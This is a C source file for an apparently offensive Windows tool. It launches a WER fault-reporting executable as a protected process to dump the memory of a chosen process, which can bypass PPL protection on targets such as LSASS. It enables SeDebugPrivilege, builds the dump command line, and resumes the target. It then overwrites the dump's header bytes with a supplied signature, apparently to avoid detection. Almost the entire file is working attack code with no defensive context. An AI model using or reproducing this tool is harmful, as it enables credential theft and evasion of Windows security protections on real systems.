#include <stdint.h>
#include <stdio.h>

#include "struct.h"

// Handle pointer in decimal
char *HandleToDecimal(HANDLE h)
{
    // Get Process Heap
    HANDLE hHeap = GetProcessHeap();
    if (!hHeap)
    {
        printf("GetProcessHeap failed: %d\n", GetLastError());
        return 0;
    }

    size_t bufferSize = 32; // Sufficient for a HANDLE (64bit) in decimal
    char *buffer = (char *)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, bufferSize * sizeof(char));
    if (!buffer)
    {
        return NULL;
    }
    sprintf_s(buffer, bufferSize, "%llu", (unsigned long long)h);

end:
    CloseHandle(hHeap);
    return buffer;
}

// Enable Debug privilege
BOOL EnableDebugPrivilege()
{
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    BOOL bReturnValue = FALSE;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        printf("[+] Failed to open process token!\n");
        goto end;
    }
    if (!LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &luid))
    {
        printf("[+] Failed to get privilege value!\n");
        goto end;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
    {
        printf("[+] Failed to get adjust privilege!\n");
        goto end;
    }
    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
    {
        printf("[+] Some error, Check me out!\n");
        goto end;
    }
    printf("[+] Enabled SeDebugPrivilege\n");
    bReturnValue = TRUE;

end:
    if (hToken)
    {
        CloseHandle(hToken);
    }
    return bReturnValue;
}

// Get PPL Status
BOOL ProcessGetProtectionLevel(DWORD dwProcessId, PDWORD pdwProtectionLevel)
{
    BOOL bReturnValue = FALSE;
    HANDLE hProcess = NULL;
    PROCESS_PROTECTION_LEVEL_INFORMATION level = {0};
    if (!(hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwProcessId)))
    {
        printf("[+] Failed to Open Process to PID: [%d]\n", dwProcessId);
        goto end;
    }
    if (!GetProcessInformation(hProcess, ProcessProtectionLevelInfo, &level, sizeof(level)))
    {
        printf("[+] Failed to Get Process Information Of PID: [%d]\n", dwProcessId);
        goto end;
    }
    *pdwProtectionLevel = level.ProtectionLevel;
    bReturnValue = TRUE;

end:
    if (hProcess)
        CloseHandle(hProcess);

    return bReturnValue;
}

// Create Process as PPL
BOOL CreatePPLProcess(DWORD Plevel, char *Path)
{
    SIZE_T size = 0;

    STARTUPINFOEX siex = {0};
    siex.StartupInfo.cb = sizeof(siex);
    PROCESS_INFORMATION pi = {0};
    LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList = NULL;
    HANDLE hProcess, hThread;
    DWORD dwProtectionLevel, Result, Exitcode;

    if (!InitializeProcThreadAttributeList(NULL, 1, 0, &size) && GetLastError() != ERROR_INSUFFICIENT_BUFFER)
    {
        printf("[+] Failed to Initialize Attribute List: Error [%d]\n", GetLastError());
        return FALSE;
    }

    // Get Process Heap
    HANDLE hHeap = GetProcessHeap();
    if (!hHeap)
    {
        printf("GetProcessHeap failed: %d\n", GetLastError());
        return FALSE;
    }

    lpAttributeList = HeapAlloc(hHeap, 0, size);
    if (!lpAttributeList)
    {
        printf("[+] Failed to Allocate Memory for Attribute List: Error [%d]\n", GetLastError());
        return FALSE;
    }

    if (!InitializeProcThreadAttributeList(lpAttributeList, 1, 0, &size))
    {
        printf("[+] Failed to Initialize Attribute List: Error [%d]\n", GetLastError());
        HeapFree(hHeap, 0, lpAttributeList);
        return FALSE;
    }

    if (!UpdateProcThreadAttribute(lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL, &Plevel, sizeof(Plevel), NULL, NULL))
    {
        printf("[+] Failed to Update Attribute List: Error [%d]\n", GetLastError());
        DeleteProcThreadAttributeList(lpAttributeList);
        HeapFree(hHeap, 0, lpAttributeList);
        return FALSE;
    }

    siex.lpAttributeList = lpAttributeList;

    // Create Process
    if (!CreateProcessA(NULL, Path, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS, NULL, NULL, &siex.StartupInfo, &pi))
    {
        printf("[+] Failed to CreateProcessA: Error [%d]\n", GetLastError());
        DeleteProcThreadAttributeList(lpAttributeList);
        HeapFree(hHeap, 0, lpAttributeList);
        return FALSE;
    }

    // Free
    DeleteProcThreadAttributeList(lpAttributeList);
    HeapFree(hHeap, 0, lpAttributeList);

    hProcess = pi.hProcess;
    hThread = pi.hThread;

    if (!ProcessGetProtectionLevel(pi.dwProcessId, &dwProtectionLevel))
    {
        printf("[+] Something went wrong, when getting protection level\n");
        return FALSE;
    }

    printf("[+] SUCCESS! Created PPL Process With Pid: [%d], Protection Level [%d]\n", pi.dwProcessId, dwProtectionLevel);

    Result = WaitForSingleObject(hProcess, INFINITE);
    if (Result == WAIT_OBJECT_0)
    {
        GetExitCodeProcess(hProcess, &Exitcode);
        // printf("[+] PPL Process exit with code: [%d]\n", Exitcode);
    }

    // printf("[+] Created Process Result code: [%d]\n", Result);
    return TRUE;
}

DWORD GetMainThreadId(DWORD pid)
{

    PVOID buffer = NULL;
    ULONG bufferSize = 64 * 1024; // 64KB
    NTSTATUS STATUS;
    const ULONG MAX_BUFFER_SIZE = 16 * 1024 * 1024; // 16MB limit
    DWORD mainThreadId = 0;

    // Get Process Heap
    HANDLE hHeap = GetProcessHeap();
    if (!hHeap)
    {
        printf("GetProcessHeap failed: %d\n", GetLastError());
        return 0;
    }

    do
    {
        // Allocate memory using HeapAlloc
        buffer = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, bufferSize);
        if (!buffer)
        {
            printf("HeapAlloc failed: %d\n", GetLastError());
            return 0;
        }

        // Query system information
        PNtQuerySystemInformation NtQuerySystemInformation = (PNtQuerySystemInformation)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQuerySystemInformation");

        STATUS = NtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, NULL);

        if (STATUS == 0xC0000004)
        { // STATUS_INFO_LENGTH_MISMATCH
            HeapFree(hHeap, 0, buffer);
            bufferSize *= 2;

            // Prevent runaway buffer size
            if (bufferSize > MAX_BUFFER_SIZE)
            {
                printf("Buffer size exceeded maximum limit (%u bytes)\n", MAX_BUFFER_SIZE);
                return 0;
            }
        }
        else if (STATUS != 0)
        { // Other errors
            HeapFree(hHeap, 0, buffer);
            printf("NtQuerySystemInformation failed: 0x%08X\n", STATUS);
            return 0;
        }
    } while (STATUS == 0xC0000004);

    // Process the SYSTEM_PROCESS_INFORMATION structure to find the main thread
    PSYSTEM_PROCESS_INFORMATION procInfo = (PSYSTEM_PROCESS_INFORMATION)buffer;
    while (procInfo->NextEntryOffset || procInfo->UniqueProcessId)
    {
        if ((DWORD)(ULONG_PTR)procInfo->UniqueProcessId == pid)
        {
            // Found the process, get the first thread (often the main thread)
            if (procInfo->NumberOfThreads > 0)
            {
                mainThreadId = (DWORD)(ULONG_PTR)procInfo->Threads[0].ClientId.UniqueThread;
                break;
            }
        }
        if (!procInfo->NextEntryOffset)
            break;
        procInfo = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)procInfo + procInfo->NextEntryOffset);
    }

    if (mainThreadId == 0)
    {
        printf("[!] Main thread not found for PID %u\n", pid);
    }
    else
    {
        printf("[*] Main thread ID for PID %u: %u\n", pid, mainThreadId);
    }

    // Clean up
    HeapFree(hHeap, 0, buffer);
    return mainThreadId;
}

// Create Thread to independently run ResumeProcess
DWORD WINAPI ResumeProcess(LPVOID lpParameter)
{
    DWORD dwProcessId = (DWORD)(ULONG_PTR)lpParameter;
    // Load ntdll.dll
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll)
    {
        printf("[!] Failed to load ntdll.dll\n");
        return 1;
    }
    // Get the address of NtResumeProcess
    pNtResumeProcess NtResumeProcess = (pNtResumeProcess)GetProcAddress(hNtdll, "NtResumeProcess");
    if (!NtResumeProcess)
    {
        printf("[!] Failed to get NtResumeProcess address\n");
        return 1;
    }

    HANDLE hProcess = OpenProcess(PROCESS_SUSPEND_RESUME, FALSE, dwProcessId);
    if (!hProcess)
    {
        printf("[!] Failed to open process with PROCESS_SUSPEND_RESUME. Error: %d\n", GetLastError());
        return 1;
    }

    for (int i = 0; i < 10; ++i)
    {
        Sleep(1000); // Optional: small delay between calls
        NTSTATUS STATUS = NtResumeProcess(hProcess);
        if (STATUS != 0)
        {
            printf("[!] Failed to resume process, retrying... \n");
        }
        else
        {
            printf("[+] Successfully resumed process %d\n", dwProcessId);
            break;
        }
    }
    CloseHandle(hProcess);
    return 0;
}

DWORD WerDump(DWORD dwProcessTid, DWORD dwProcessId, char werPath[MAX_PATH], char werDump[MAX_PATH], unsigned char werSig[MAX_PATH])
{
    DWORD dwProtectionLevel = 0;

    SECURITY_ATTRIBUTES sa = {};
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    HANDLE hDump = CreateFileA(werDump, GENERIC_WRITE, 0, &sa, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    HANDLE hEncDump = CreateFileA("enc.dump", GENERIC_WRITE, 0, &sa, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDump == INVALID_HANDLE_VALUE || hEncDump == INVALID_HANDLE_VALUE)
    {
        printf("[!] CreateFileA failed: %d\n", GetLastError());
    }

    HANDLE hCancel = CreateEventA(&sa, TRUE, FALSE, NULL);
    if (!hCancel)
    {
        printf("[!] CreateEventA failed: %d\n", GetLastError());
        CloseHandle(hDump);
        CloseHandle(hEncDump);
        return 1;
    }

    size_t cmdSize = 1024; // Adjust based on expected length
    HANDLE hHeap = GetProcessHeap();
    if (!hHeap)
    {
        printf("[!] GetProcessHeap failed: %d\n", GetLastError());
        return 1;
    }

    char *commandLine = (char *)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, cmdSize * sizeof(char));
    if (!commandLine)
    {
        return 1; // Handle allocation failure
    }

    // Convert handles to decimal strings
    char *hDumpStr = HandleToDecimal(hDump);
    char *hEncDumpStr = HandleToDecimal(hEncDump);
    char *hCancelStr = HandleToDecimal(hCancel);

    if (!hDumpStr || !hEncDumpStr || !hCancelStr)
    {
        printf("[!] Failed to convert to handle decimal\n");
        goto end;
        return 1; // Handle allocation failure
    }

    // Build the command line using sprintf
    int result = sprintf_s(
        commandLine,
        cmdSize,
        "\"%s\" /h /pid %d /tid %d /file %s /encfile %s /cancel %s /type 268310",
        werPath,
        dwProcessId,
        dwProcessTid,
        hDumpStr,
        hEncDumpStr,
        hCancelStr);
    if (result < 0)
    {
        printf("[!] sprintf_s failed\n");
        goto end;
    }

    DWORD dwThreadId;
    HANDLE hThreadId = CreateThread(NULL, 0, ResumeProcess, (LPVOID)(ULONG_PTR)dwProcessId, 0, &dwThreadId);
    if (!hThreadId)
    {
        printf("[!] CreateThread failed: %d\n", GetLastError());
        return FALSE;
    }
    // CloseHandle(hThreadId);

    BOOL status = CreatePPLProcess(dwProtectionLevel, commandLine);
    if (!status)
    {
        printf("[!] Cannot Create PPL process :(\n");
        goto end;
    }
    WaitForSingleObject(hThreadId, INFINITE);

    SetFilePointer(hDump, 0, NULL, FILE_BEGIN);
    DWORD bytes;
    if (!WriteFile(hDump, werSig, 4, &bytes, NULL))
    {
        printf("[!] WriteFile failed: %d\n", GetLastError());
        goto end;
    }

    printf("[+] Successfully Dumped process %d, Find the dump in the following path %s \n", dwProcessId, werDump);

end:
    // Clean up
    HeapFree(hHeap, 0, commandLine);
    HeapFree(hHeap, 0, hDumpStr);
    HeapFree(hHeap, 0, hEncDumpStr);
    HeapFree(hHeap, 0, hCancelStr);
    CloseHandle(hDump);
    CloseHandle(hEncDump);
    CloseHandle(hCancel);
    DeleteFileA("enc.dump");
    return 0;
}

int main(int argc, char *argv[])
{
    if (argc != 5)
    {
        printf("Usage: %s <werPath> <ProcessId> <werDumpPath> <werSignature>\n", argv[0]);
        return 1;
    }

    unsigned char *werPath = argv[1];
    DWORD dwProcessId = atoi(argv[2]);
    unsigned char *werDump = argv[3];
    unsigned char *werSig = argv[4];

    if (!EnableDebugPrivilege())
    {
        printf("[+] Failed to enable SeDebugPrivilege\n");
        return 1;
    }

    DWORD dwProcessTid = GetMainThreadId(dwProcessId);
    if (dwProcessTid == 0)
    {
        printf("[+] Failed to get main thread ID\n");
        return 1;
    }

    if (WerDump(dwProcessTid, dwProcessId, werPath, werDump, werSig) != 0)
    {
        printf("[+] Failed to dump\n");
        return 1;
    }
    return 0;
}